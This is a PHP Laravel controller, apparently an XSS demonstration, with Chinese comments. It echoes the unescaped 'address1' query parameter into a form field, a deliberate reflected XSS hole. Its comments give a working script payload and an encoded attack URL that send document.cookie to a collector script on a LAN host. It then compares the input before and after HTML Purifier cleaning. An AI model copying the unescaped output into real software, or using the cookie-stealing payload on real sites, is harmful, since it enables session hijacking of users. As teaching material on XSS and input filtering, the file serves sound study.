<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Input;

class XssController extends Controller
{
    public function getIndex(){
        $add = $_GET['address1'];
        $url = url('xss/up');   //大小写是敏感的 不能写成大写的 否则找不到
        //测试代码
        //"/> <script>window.open("http://192.168.31.180/xss/xss_hacker.php?cookie="+document.cookie);</script><!--
        //这个代码好使与否还跟这个页面代码有关 action 这个form属性去掉才会好使  因为在本页执行
        //否则就看跳转到那个页面过滤如何 也就是Purifier这个插件用到的位置
        //Purifier是防止获取网站权限的  但除了ie存在这个问题 其他浏览器都不存在了
        //直接用下面这句就可以获得客户端cookies
        //http://localhost/jiaocheng/public/xss?address1=%22%2F%3E+%3Cscript%3Ewindow.open%28%22http%3A%2F%2F192.168.31.180%2Fxss%2Fxss_hacker.php%3Fcookie%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E%3C%21--
        $html = <<<XSS
       <!doctype html>
<html>
    <head>
        <title>XSS demo</title>
    </head>
    <body>
    <form method='get' >
    <input style="width:300px;" type="text" name="address1" value="$add" />
            <input type="submit" value="Submit" />
        </form>
        <h1>测试代码</h1>
			在这个文件里 xss_victim.txt
    </body>
</html>
XSS;
    return $html;
    }

    public function getUp(){
        $a = Input::get('address1');
        $b = clean(Input::get('address1'));
        dump($a);
        dump($b);
    }
}

